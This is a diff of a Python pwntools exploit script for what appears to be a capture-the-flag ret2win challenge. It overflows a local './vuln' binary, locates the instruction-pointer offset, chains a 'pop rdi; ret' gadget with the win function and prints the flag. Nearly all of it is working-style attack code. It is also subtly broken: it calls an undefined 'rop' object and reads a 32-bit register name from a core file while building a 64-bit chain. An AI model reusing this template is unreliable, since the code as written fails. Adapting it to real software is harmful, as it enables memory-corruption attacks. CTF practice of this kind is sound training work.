@@ -1,47 +1,61 @@
 from pwn import *
 
-# Many built-in settings can be controlled via CLI and show up in "args"
-# For example, to dump all data sent/received, and disable ASLR
-# ./exploit.py DEBUG NOASLR
+# Use to find EIP/RIP if you want :)
 
 
-def start(argv=[], *a, **kw):
-    # Start the exploit against the target
-    if args.GDB:
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe] + argv, *a, **kw)
+def find_eip(payload):
+    # Launch process and send payload
+    p = process(exe)
+    p.sendlineafter('>', payload)
+    # Wait for the process to crash
+    p.wait()
+    # Print out the address of EIP/RIP at the time of crashing
+    eip_offset = cyclic_find(p.corefile.eip)
+    info('located EIP offset at {a}'.format(a=eip_offset))
+    # Return the EIP offset
+    return eip_offset
 
-
-# Specify your GDB script here for debugging
-gdbscript = '''
-init-pwndbg
-continue
-'''.format(**locals())
 
 # Set up pwntools for the correct architecture
 exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
-
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'info'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
-io = start()
+# Pass in pattern_size, get back EIP offset
+offset = find_eip(cyclic(100))
 
-padding = 40 # How many bytes to EIP?
+# Start program
+io = process()
 
+# Gadgets
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+
+# Print out the target addresses/gadgets
+info("%#x pop rdi; ret", pop_rdi)
+
+# Build the payload
 payload = flat(
-    asm('nop') * padding,  # Padding to EIP
-    elf.symbols['ret2win'],  # win_function - 0x804862c
+    asm('nop') * offset,
+    pop_rdi,
+    0xdeadbeef,
+    elf.symbols.ret2win  # pwn???
 )
 
-# Save the payload
-f = open("payload", "wb")
-f.write(payload)
+# gdb.attach(io, gdbscript='''
+# init-pwndbg
+# break *0x40069a
+# ''')
 
-# PWN
+# Send the payload
 io.sendlineafter('>', payload)
-io.interactive()
+io.recvuntil('Thank you!\n')
+
+# Get our flag!
+flag = io.recv()
+success(flag)
